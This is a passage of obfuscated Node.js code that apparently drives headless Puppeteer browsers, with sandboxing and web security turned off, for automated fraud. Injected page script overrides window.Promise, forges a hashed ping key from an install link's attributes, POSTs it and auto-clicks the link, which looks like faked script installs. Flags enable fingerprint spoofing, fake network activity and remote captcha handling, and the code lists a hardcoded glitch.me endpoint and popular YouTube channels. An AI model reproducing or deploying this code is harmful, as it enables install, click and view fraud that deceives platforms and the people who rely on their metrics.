0x1399 * -0x1 + -0x12a2 * 0x1) << y[-0x2341 + 0x1b16 + 0x82e & N++], P[N >> -0x1b4f * 0x1 + -0x4ed + 0x203e] |= (0x4a2 * -0x8 + -0x1806 + 0x3d96 | 0x433 + -0xd * -0x2b + -0x623 & L) << y[-0x118b + 0x2541 + 0x7b * -0x29 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x1 * 0x62a + -0xbd9 + 0x5ef ? (this['block'] = P[-0x6d * 0x3c + -0x9f0 * -0x3 + -0x434], this['start'] = N - (-0x1f * 0xd + 0x1ac + -0xd * -0x3), this['hash'](), this['hashed'] = 0xa9 * -0x35 + 0x5e1 + 0x1d1d) : this['start'] = N;
                }
                return this['bytes'] > 0x314bcdf0 + -0x1bd6b0357 + -0x2 * -0x1460f9ab3 && (this['hBytes'] += this['bytes'] / (-0x13d86b418 + -0xcd7a1ba4 + -0xc2c033ef * -0x4) << 0x20df + -0x738 + 0x21 * -0xc7, this['bytes'] = this['bytes'] % (0x6e * 0x11a0016 + 0x1001e5404 + -0x794a5d78)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x139b + -0x5 * -0x257 + -0x1f4d;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x2 * 0xeb9 + -0x1 * 0x206d + 0x30b] = this['block'], J[K >> 0x216d * 0x1 + -0x1b5f + -0x12 * 0x56] |= x[0x9d3 + -0x1392 + 0x9c2 & K], this['block'] = J[0x1cf2 + 0x1 * -0x265a + 0x65 * 0x18], K >= -0x147 + -0xc * -0xdb + 0x1c1 * -0x5 && (this['hashed'] || this['hash'](), J[-0x2 * 0xb5c + -0x6b9 + -0x1d71 * -0x1] = this['block'], J[-0x1fbf + 0x1bbb * -0x1 + -0x1dc5 * -0x2] = J[0x13d2 + 0x12bf + -0x2 * 0x1348] = J[-0x225e + -0x1 * 0x2401 + 0x4661] = J[0x16a1 * -0x1 + 0x109c + 0x608] = J[-0x20ab + -0xb41 + -0x4c * -0x94] = J[-0x3a * 0x59 + -0x25 * 0x7f + 0x268a * 0x1] = J[0x1237 + 0x1a84 + -0x2cb5] = J[-0x1a42 * -0x1 + 0x113f + -0x46 * 0x9f] = J[-0x374 + -0x11e0 + 0x155c] = J[0x2c1 + 0x7 * 0x281 + -0x47 * 0x49] = J[-0x101 + -0xaff * -0x1 + -0x9f4] = J[-0x1661 + -0x1 * 0x1db7 + 0x3423] = J[0x1 * -0x581 + 0x2072 + -0x1ae5] = J[0xba7 + -0x1b97 + 0xffd] = J[-0x263 * 0x1 + -0xbed + -0x4ca * -0x3] = J[-0x185 * 0x3 + -0x213d + 0x25db] = -0x4e5 * -0x5 + -0x1132 + 0x51 * -0x17), J[0x1a20 + 0x1 * -0x18f5 + -0x11d] = this['hBytes'] << 0xb00 + 0x19 * -0x103 + -0x2 * -0x727 | this['bytes'] >>> 0x24 * -0x7b + 0x42 + 0x1127 * 0x1, J[0xe5a + 0x16e7 + -0x2532] = this['bytes'] << 0x1c29 + 0xc2 * -0x7 + 0x5b6 * -0x4, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1b7a * -0x1 + -0x307 * -0x1 + 0x1 * -0x1e71; J < 0x3b0 + -0xb * -0x2 + -0x1bb * 0x2; ++J)
                K = Q[J - (-0x2e * -0x4a + 0x11 * -0x239 + -0x188 * -0x10)] ^ Q[J - (-0xdf1 + 0x1ff8 + -0x11ff)] ^ Q[J - (0x5d5 + -0xd87 + 0x7c0)] ^ Q[J - (-0x2c * -0x39 + -0x3 * 0xa79 + 0x15af)], Q[J] = K << -0x17 * 0x46 + 0x79c + 0x1 * -0x151 | K >>> 0x2 * -0x45d + -0x81b * -0x3 + 0x14 * -0xc6;
              for (J = 0x58a * -0x7 + 0x1 * 0x93f + 0x1d87; J < -0x110 * -0x22 + -0x1ef7 + -0x515; J += 0x4 * -0x427 + 0x36 + 0x106b * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x26d1 + 0x1580 + 0x1156 | L >>> 0xb23 + 0x1 * -0xfc7 + 0x4bf) + (M & N | ~M & O) + P + (0x2deba01d + 0x7a * -0x145b49f + 0x70f * 0x1c4e9e) + Q[J] << -0x15b4 + 0x1 * 0x943 + 0xc71) << -0x2 * -0xed6 + -0x8 * 0x44d + 0x4c1 | P >>> 0x1 * -0x151d + 0x2605 + -0x10cd) + (L & (M = M << 0x1df6 + 0x2dd * 0x5 + -0x2c29 | M >>> 0x1c9c + 0x1 * -0x25c5 + 0x92b) | ~L & N) + O + (0xa6dd0893 + 0x62b5b1e8 + -0x1 * 0xaf1040e2) + Q[J + (0x1297 + 0x1 * 0xe5 + -0x137b)] << -0x12d4 + 0x1 * -0xa78 + 0x1d4c) << 0x16 * 0xbc + 0xc5f * -0x1 + 0x1 * -0x3c4 | O >>> 0x12e9 * 0x2 + 0x6c5 + -0x2c7c) + (P & (L = L << -0x329 * -0x9 + -0x2 * -0x78d + -0x1 * 0x2b6d | L >>> -0x1f45 + 0x8e6 + -0x1 * -0x1661) | ~P & M) + N + (0xa4deda2 * -0xd + -0x27ac * 0x3b8ed + 0x1 * 0x17423e50f) + Q[J + (-0x2061 + -0xb3c + 0x2b9f * 0x1)] << 0x1d5b + -0x24d * 0x1 + 0x1b0e * -0x1) << 0xf9d + 0x17a4 + -0x273c | N >>> 0x11 * 0x73 + -0x6a0 * 0x2 + 0x5b8) + (O & (P = P << -0x249d + 0x3d * 0x1d + 0x1dd2 | P >>> 0x183a + 0x238a + 0x3bc2 * -0x1) | ~O & L) + M + (-0xb63c638 + 0x10417 * 0x47d2 + 0x1cee83f3) + Q[J + (0xf1 * 0x15 + -0x225f + 0xe9d)] << 0xe * -0x44 + 0x1a * -0x29 + 0x7e2) << 0x147d * -0x1 + 0x25a7 + -0x1125 | M >>> -0xa81 * 0x1 + -0xb35 * 0x3 + 0x2c3b) + (N & (O = O << 0x13 * 0x136 + -0x235b + 0xc77 | O >>> 0xa31 + 0x12ea + 0xd * -0x23d) | ~N & P) + L + (0x6b09eeac + 0x6c7c845 + 0x1cb04b8 * -0xd) + Q[J + (0x2bd + -0xe8 * 0x21 + 0x1b2f)] << -0x844 + 0x1dc8 + -0x1584, N = N << -0xb4b + -0x17dc * 0x1 + 0x2345 | N >>> 0x167 + 0x18ff + -0xd32 * 0x2;
              for (; J < -0x13a1 + -0x38b + 0x1754; J += 0x2 * -0x377 + 0x11b * 0x7 + -0xca)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x5f7 + -0x574 * 0x5 + 0x2140 | L >>> -0x257e + 0x1ad4 + 0xac5) + (M ^ N ^ O) + P + (-0xe35350c + -0xb1d4ad5 * -0x11 + -0x2a973a5 * 0x18) + Q[J] << -0x151c + -0x1003 + -0x22f * -0x11) << 0x1ad4 + 0x1 * 0x23ef + 0x2 * -0x1f5f | P >>> 0x1 * -0x491 + -0xbb6 * -0x3 + -0x1e76) + (L ^ (M = M << 0x1 * 0x682 + -0x1cf1 * -0x1 + -0x2355 | M >>> 0x57e + 0x24d1 + -0x31 * 0xdd) ^ N) + O + (-0x4 * 0x1ddef972 + 0x1 * 0xb4e331fb + 0x9 * 0x57e837e) + Q[J + (0x2 * 0x1278 + 0x1 * 0xcc + -0x25bb)] << 0x10 * -0xda + -0x22e4 + 0x5c * 0x87) << -0x12db + -0x450 * -0x8 + -0xfa0 | O >>> 0xb * 0x79 + 0x577 + 0x385 * -0x3) + (P ^ (L = L << -0x1 * 0xf62 + -0xa46 + -0xce3 * -0x2 | L >>> 0x61 * 0x11 + 0xa70 + -0x10df) ^ M) + N + (-0x4 * -0x1c44eb9 + -0xf7b42f7 + 0x7743f3b4) + Q[J + (-0x287 * 0xc + -0x1 * 0x809 + -0xb * -0x37d)] << -0x236 + -0xe6b * -0x2 + -0x1aa0) << -0x277 * -0x1 + -0x178a + 0x1e * 0xb4 | N >>> -0xe4b + 0x24bb * -0x1 + 0x3321) + (O ^ (P = P << 0x1363 + 0x5 * 0x2a1 + -0x206a | P >>> -0x25ed + 0xeb * 0x5 + 0xb * 0x308) ^ L) + M + (-0x7f598526 + -0xd76e92a7 * 0x1 + 0x1c5a2036e) + Q[J + (0x5b * 0x3 + -0x67 * 0x7 + 0xb * 0x29)] << -0x2 * 0x2fb + 0x1066 * 0x1 + 0x29c * -0x4) << 0x2579 + -0x8e * 0x11 + -0x1c06 | M >>> 0x1 * 0x1706 + -0x1e7 * 0xf + 0x59e) + (N ^ (O = O << -0xd08 * 0x1 + 0x1a9 * 0xc + -0x242 * 0x3 | O >>> -0x3 * -0xb03 + -0x1bc7 + 0x15 * -0x40) ^ P) + L + (0x4cbf * -0x8ecf + 0x9019cb7c + 0x14bf31 * 0x76) + Q[J + (-0x1b5b + -0xbdd + 0xd14 * 0x3)] << -0x10aa + 0x15a9 + 0x1 * -0x4ff, N = N << -0xb7 * 0x2d + -0x1f * -0xf6 + 0x27f | N >>> -0x13 * 0x8a + 0x3a6 + 0x69a;
              for (; J < -0x1 * 0x259f + -0x1 * 0x24ff + 0xb * 0x6ce; J += -0x2273 + -0x2177 * -0x1 + -0x1 * -0x101)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xce5 + -0x106 * -0x1 + 0xbe4 | L >>> 0x420 + 0x161 * 0x11 + -0x1b76) + (M & N | M & O | N & O) + P - (-0x3459c2aa + -0x83126dcf + 0x164f * 0xd4853) + Q[J] << -0x567 * 0x2 + 0x3fb * 0x4 + 0x106 * -0x5) << 0x1 * -0x117a + -0x2510 + -0x368f * -0x1 | P >>> 0x254b * 0x1 + -0x44b + 0x4b3 * -0x7) + (L & (M = M << 0x397 * 0x5 + 0xb0f * -0x2 + 0x449 | M >>> 0x4 * -0x6da + -0x1 * 0xcbb + 0x2825) | L & N | M & N) + O - (0xc76adde9 * -0x1 + 0xc64b8592 + 0x72039b7b * 0x1) + Q[J + (-0x52d + 0x851 * 0x3 + -0x13c5)] << -0x2704 + -0x2359 + 0x4a5d) << 0xf05 + -0x2177 * -0x1 + 0x28d * -0x13 | O >>> 0x6 * -0x1c1 + -0x1 * -0x5fb + -0x1 * -0x4a6) + (P & (L = L << -0x2317 + 0x15f6 + 0xd3f | L >>> 0x1fd * 0xd + -0xe20 + -0x1 * 0xbb7) | P & M | L & M) + N - (-0xcae0c440 + -0x1fd62f0 * -0x6 + -0x307de1 * -0x644) + Q[J + (-0xb4d + 0x3d * -0x7f + 0x2992)] << 0x1 * -0x734 + -0x12ee + 0x1a22) << -0x78 * -0x1 + 0x1d53 + -0x1dc6 | N >>> -0x1973 + -0x101 * 0x26 + 0x3fb4) + (O & (P = P << 0x2 * 0x45 + -0x1 * -0x2297 + -0x2303 | P >>> -0x97 * 0x7 + 0x1 * 0xe1b + 0x13f * -0x8) | O & L | P & L) + M - (0xb66ce3fa * -0x1 + 0x8068c5a2 * 0x1 + 0x34 * 0x335b31b) + Q[J + (-0x80e + 0x84 * 0x3b + -0x1 * 0x165b)] << 0x16 * 0x42 + -0xd65 * -0x1 + -0x1311) << 0x1 * 0x1f97 + 0xc8c * 0x3 + -0x4536 | M >>> -0x18 * 0x19 + -0xc52 + 0xec5) + (N & (O = O << -0x126 + -0xd0d + 0xe51 | O >>> -0x1d * -0xaf + 0x11c * 0x1f + 0x1 * -0x3635) | N & P | O & P) + L - (0x444c7876 + -0x1f6 * -0x2db335 + -0x2d059f40) + Q[J + (0x7 * 0x5f + -0x72b + -0x496 * -0x1)] << -0x80 * 0x7 + -0x1da0 + -0xa0 * -0x35, N = N << 0x335 * -0x4 + -0x1 * -0x8ba + 0x438 | N >>> 0x3 * 0x69d + -0x1 * 0xb29 + -0x8ac;
              for (; J < -0x892 + -0xaf3 + -0x1 * -0x13d5; J += -0x162 * 0x18 + -0x126e * -0x1 + 0x27 * 0x61)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x1 * -0x2309 + 0x1bc5 * -0x1 + -0x1 * -0x3ed3 | L >>> 0x2643 + 0x6b * -0x43 + -0x17 * 0x71) + (M ^ N ^ O) + P - (0x5 * 0x8239682 + 0x3cb0c72f * -0x1 + 0xa8402f9 * 0x7) + Q[J] << 0x1bc3 + -0x9b5 + 0x2 * -0x907) << 0xdc1 + -0x227a + 0x14be | P >>> 0x1d6 * -0x5 + 0x1aeb + -0x11a2) + (L ^ (M = M << 0x244e + -0x2709 * -0x1 + -0x395 * 0x15 | M >>> 0x1c27 + -0x20d8 + -0x1 * -0x4b3) ^ N) + O - (-0x16cbf31f + -0xd4ce * 0x23a7 + 0x1 * 0x6a0c2dab) + Q[J + (0x166 * 0x1b + -0x22e7 + -0x2da)] << -0x66 + -0x191 * -0x1 + -0x12b) << -0x1213 + 0x2708 + -0x2 * 0xa78 | O >>> -0x51e * -0x4 + 0x2 * 0x278 + -0x194d) + (P ^ (L = L << 0x1911 + 0x1b6e + -0x35 * 0xfd | L >>> 0x1 * 0x481 + -0xce9 * -0x1 + -0x1168) ^ M) + N - (-0x2619090d + 0x39166eac + 0x229fd88b) + Q[J + (-0x1 * 0xc1f + 0x72a + 0x1f * 0x29)] << 0xf67 + -0x2d2 + -0xc95 * 0x1) << -0x2e * 0xce + 0x107 * -0x20 + -0x65b * -0xb | N >>> -0x26b0 + -0x11 * -0x19d + 0x123 * 0xa) + (O ^ (P = P << 0xb5c * -0x1 + -0x10d3 + 0x40b * 0x7 | P >>> 0x10d * -0x4 + -0xb15 * 0x2 + -0xd30 * -0x2) ^ L) + M - (0x51cba115 * 0x1 + -0x2f4b72db * 0x1 + 0x131d0ff0) + Q[J + (-0x690 + 0x206e + 0x19db * -0x1)] << -0x2 * -0xb56 + -0x2b0 * 0xe + 0xef4) << 0xc71 + 0x1 * 0x1994 + -0x2600 | M >>> -0x1195 + 0x1b8a + 0xd * -0xc2) + (N ^ (O = O << 0x12b5 + 0x1 * -0x1369 + 0x6 * 0x23 | O >>> -0x306 + 0x12ca * 0x2 + -0x2e1 * 0xc) ^ P) + L - (-0x17 * 0x407c97d + 0x12111689 * 0x5 + 0x1bfd73dc * 0x2) + Q[J + (0x766 * 0x1 + 0x19f5 + -0x6ab * 0x5)] << 0x1 * 0x68f + 0x1 * -0x38f + -0x300, N = N << -0x15dd + 0x1 * -0xa44 + 0xd * 0x27b | N >>> -0xc03 + -0x2b * 0x3a + 0x15c3;
              this['h0'] = this['h0'] + L << -0x3 * 0x4f9 + -0xec + 0xfd7, this['h1'] = this['h1'] + M << -0x242a + 0x1c8b * 0x1 + 0x79f, this['h2'] = this['h2'] + N << 0x15bc + -0xb8f + -0xa2d, this['h3'] = this['h3'] + O << 0x33 * 0x56 + 0x37d * 0x2 + -0x1 * 0x181c, this['h4'] = this['h4'] + P << 0x1502 + -0x1 * -0x1ebe + -0x48 * 0xb8;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x455 + -0x102e + 0xbf5 & -0x263c + -0x54e * -0x1 + 0x20fd] + w[J >> -0x16a4 + -0x5 * -0x527 + -0x307 & 0x1 * -0x1a4d + 0x10e8 + -0x4 * -0x25d] + w[J >> -0x1d * -0x5b + -0x1ae * 0x1 + -0x88d & 0x1501 + 0x5 * -0x4eb + 0x3a5] + w[J >> -0xa36 + 0x1929 + -0xee3 * 0x1 & -0x17ca + 0x1 * 0xfb + 0x16de] + w[J >> 0x2cb + 0x1cf + -0x48e & 0x279 * 0x5 + 0xe90 + 0xb5 * -0x26] + w[J >> -0x1 * 0x1717 + 0x1 * -0x22bf + 0x39de & -0x2 * -0xccb + -0x427 * 0x4 + 0x2f9 * -0x3] + w[J >> -0x1a86 + 0x10ee + 0x99c & 0x1 * -0x1c03 + 0xec0 + 0xb * 0x136] + w[-0x250a + 0x25f9 + -0xe0 & J] + w[K >> -0xda * -0x24 + 0x18ef * -0x1 + -0x1 * 0x59d & -0x1c2 + 0x5b9 * -0x3 + 0x21c * 0x9] + w[K >> 0x70 + 0x1c35 + 0x1c8d * -0x1 & -0x15c * 0x7 + 0xbcf + -0x23c] + w[K >> 0x5d9 * -0x3 + -0xa1d * 0x1 + -0x2 * -0xdde & 0x681 * 0x1 + 0x2 * -0x761 + 0x38 * 0x26] + w[K >> -0x6 * 0x161 + 0x3b * -0xa1 + 0x2d71 & -0xfe * -0x27 + -0x1b88 + -0xb1b * 0x1] + w[K >> -0x25d9 * 0x1 + -0x10d * 0x11 + -0x1a * -0x225 & -0x1a4a + 0x2 * -0xc3c + 0x1 * 0x32d1] + w[K >> -0xb2d * 0x1 + -0x2f * -0xb5 + -0x1 * 0x1606 & 0x1 * -0x1e8e + 0x1 * 0x2306 + -0x469] + w[K >> -0x4d * -0x31 + 0x103d * 0x2 + -0x2f33 & 0x1 * 0x125b + 0x1a74 * 0x1 + -0x10 * 0x2cc] + w[-0x17f0 + -0x3a * 0x72 + 0x31d3 & K] + w[L >> 0x5b3 * -0x2 + -0x1 * -0x1ef6 + -0x1f2 * 0xa & 0x3 * -0xc67 + -0x1 * 0x1591 + -0x3ad5 * -0x1] + w[L >> 0xf7f * -0x1 + 0x5b7 + 0x9e0 & 0x8d1 * -0x1 + 0x405 + 0x4db] + w[L >> -0x2041 + -0x1 * 0x18af + 0x1 * 0x3904 & -0x2 * -0xd1c + 0x2185 * -0x1 + 0x75c] + w[L >> 0x2a3 + 0x47f * -0x2 + 0x66b & 0x1f2f + -0x17cf + -0x751] + w[L >> 0x7e9 * -0x1 + -0x4a6 + 0x7 * 0x1cd & -0x9dd * 0x2 + -0x1a5d + 0x2e26] + w[L >> -0x137f + 0x174a + -0x3c3 & -0x1301 + -0x1f9 * -0x8 + 0x348] + w[L >> 0x757 + 0x11 * -0x1bb + 0x1618 & -0xd7e * -0x1 + 0x1f9 * 0x11 + -0x2ef8] + w[0x19cb + 0x202c + -0x39e8 & L] + w[M >> -0x14cc + -0x175d + -0x2c45 * -0x1 & -0xc9 * 0x1c + -0x25f * -0x10 + -0xfe5 * 0x1] + w[M >> -0x139d + -0xca7 * 0x1 + 0x205c & -0x16ff + 0x2079 + -0x1 * 0x96b] + w[M >> -0x2b * 0xb1 + -0x1 * 0x19d1 + 0x164 * 0x28 & 0x9d3 + 0x136 * 0x13 + 0x68e * -0x5] + w[M >> -0x2027 + -0x710 + 0x2747 & 0x798 + 0x240f * -0x1 + -0x3 * -0x982] + w[M >> -0xb * -0x4 + -0xe37 + 0xe17 & -0x2 * -0x89b + -0x35 * -0x6 + -0x1265] + w[M >> 0xd10 + 0x3 * -0xabf + 0x21 * 0x95 & -0x190f + 0x1c43 + -0x5 * 0xa1] + w[M >> -0x185a + 0x26da + 0x19c * -0x9 & -0x100e + 0x4c * 0x65 + 0x43 * -0x35] + w[-0x2 * 0xd5a + -0xb * 0x8b + -0x5 * -0x68c & M] + w[N >> 0x1 * 0x89b + 0x27f * -0xf + 0x1cf2 & 0x14a * 0xc + 0x277 * -0x1 + -0x679 * 0x2] + w[N >> -0x1f7b + -0x1073 * 0x1 + 0x3006 & -0x1360 + 0x1aa6 + -0x737] + w[N >> -0x1fda + 0x1c0a + 0x3e4 & 0x2b * 0x61 + 0x9f * -0x3 + 0xd * -0x11b] + w[N >> 0x4b8 + -0xe16 + 0x96e & 0x13f * 0x11 + 0x26 * 0x73 + -0x2632] + w[N >> 0x406 + 0xcb3 + -0x10ad & 0x81 * -0x23 + 0xf4 * -0x2 + 0x139a] + w[N >> 0x267d * 0x1 + -0x135d + -0x1318 & 0x3 * -0x291 + 0x105f + 0x5 * -0x1b9] + w[N >> -0xe * 0x4 + -0x1622 + -0xb2f * -0x2 & -0x12b3 + -0x35f * 0xb + 0x37d7] + w[0x4a * 0x5d + 0x1d8d + -0x3860 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd6 * 0xa + -0x542 + 0xdb6 & 0xc1 + 0x2522 + -0x24e4,
                J >> -0xde6 + -0x1aaa + 0x28a0 & -0x1523 + -0x470 * -0x2 + 0xd42,
                J >> 0x38e + -0x1 * -0x1cd + 0x1 * -0x553 & -0x47b * -0x5 + 0x1cce + -0x3236,
                -0x1eb + 0x185 * 0x3 + -0x1a5 & J,
                K >> -0xc7d + 0x21c5 + -0x1530 & 0x17a3 + 0x173f * 0x1 + -0x11 * 0x2b3,
                K >> 0x623 * -0x1 + -0xd7a + 0x13ad & 0xfad + 0x269e * -0x1 + 0x17f0,
                K >> -0x37c * -0xb + -0x56 * -0x2 + 0x137c * -0x2 & -0x25e2 + 0x209 * -0x2 + -0xf * -0x2dd,
                0x5a5 + -0x1ed4 + 0x8ba * 0x3 & K,
                L >> -0x1 * -0xa1d + -0x4f * 0x61 + 0x1 * 0x13ea & 0x3b * 0x35 + -0x183c + 0xd04,
                L >> 0x1 * 0x1edf + -0xdb7 + -0x1118 & -0x230e + 0xd96 + 0x1677,
                L >> 0x800 * 0x2 + 0x46d + -0x1465 & 0xa77 + -0x1f3d + 0x15c5,
                0x18 * 0x11b + 0x2216 + -0x1 * 0x3b9f & L,
                M >> 0x1 * -0x9ff + 0x2038 + -0x67 * 0x37 & -0x1 * -0x1681 + -0xa85 * -0x1 + -0x2007,
                M >> -0xd * -0x1bf + 0x1eeb + -0xab6 * 0x5 & -0x51d * 0x1 + 0x5 * -0x437 + 0x1 * 0x1b2f,
                M >> -0x1 * -0x3b6 + 0x660 + -0xa0e & -0x505 * -0x5 + -0x445 + -0x13d5,
                -0x24b * -0x11 + -0x1d * -0x35 + -0x1 * 0x2bfd & M,
                N >> -0xa77 + 0x3a5 * -0x5 + 0x133 * 0x18 & 0x25 * -0x2a + 0xa2d + -0x2 * 0x18e,
                N >> 0x374 + 0x182f + -0x1b93 & -0x1745 + 0xeb6 + -0x4c7 * -0x2,
                N >> -0xc82 + -0x5 * 0x5a7 + 0x829 * 0x5 & 0x1669 + 0x2689 + -0x3bf3 * 0x1,
                -0x7c * 0x3c + -0x1263 + -0x12 * -0x2b1 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x2405 + 0x1311 + -0x3702), (K = new DataView(J))['setUint32'](0x1 * -0x1736 + 0x1 * 0x165 + -0x5 * -0x45d, this['h0']), K['setUint32'](-0xf79 + 0x1c64 + 0x1 * -0xce7, this['h1']), K['setUint32'](-0x151 * -0xd + -0x12aa * -0x1 + 0x23bf * -0x1, this['h2']), K['setUint32'](0xbc4 + 0x2160 + -0x2d18, this['h3']), K['setUint32'](0x23c8 + -0x3 * -0x608 + 0x15 * -0x290, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + V(0xc) + 'me']('install-li' + 'nk')[0xad0 + 0x9f1 + -0x14c1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x3 * -0x1cd + -0x173 * -0x3 + -0x9c0;
            J[0x175c + -0x1 * 0x66d + -0x55 * 0x33]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0x267c + 0x24f1 + -0x18b * -0x1] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x2641 * 0x1 + 0x8ad * -0x4 + 0x48f6), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xf2f + -0x8 * -0x445 + -0x3156;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x1 * 0x11ab + 0x1c41 + -0x2810), Promise['resolve'](0x74b * -0x3 + 0x1718 + -0x136);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x2226 + 0xa13 * -0x2 + 0x364c; j < 0x1869 + 0x174c + -0x2fb4 * 0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x569 + -0x13b2 + -0x9 * -0x643 + (-0x3a8 * -0x1 + 0x186f + 0x105f * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1193 * 0x1 + 0x2429 + -0x35b9) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function a() {
  const bm = [
    'gxerFIiq',
    'BCktgSkcW5eiWRhcPCk0eW',
    'e0VcLgjNdatdPSkfkq',
    'CMCVzw4VC2nYAq',
    'WQ4kW7BdOCo7EGbqWQqC',
    'cM9oW7m',
    'CMvJDa',
    'WRtdK8oMEGKaamoWW7zE',
    'W453WQS',
    'floor',
    'C3bSAxq',
    'yxbWBgLJyxrPBW',
    'C0j5q2XHC3noyq',
    'DxrVyNjLywSTzG',
    'cmoRCaziW49qW4VcH8oC',
    'yZm1nZK1nq',
    'vrZdPrhcHSobiwKSWQW',
    'zwfZEwzVCMSUBW',
    'nJGWyJK3mMyMDq',
    'W4n6WRVdGmk1WOb6W6rAWQC',
    'BWeqoARup-'
  ];
  a = function() {
    return bm;
  };
  return a();
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * 0x25b0 + -0x667 * -0x5 + -0x45b3; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    const W = b;
    return this[floor(random() * this[W(0x0, 'VSTo')])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
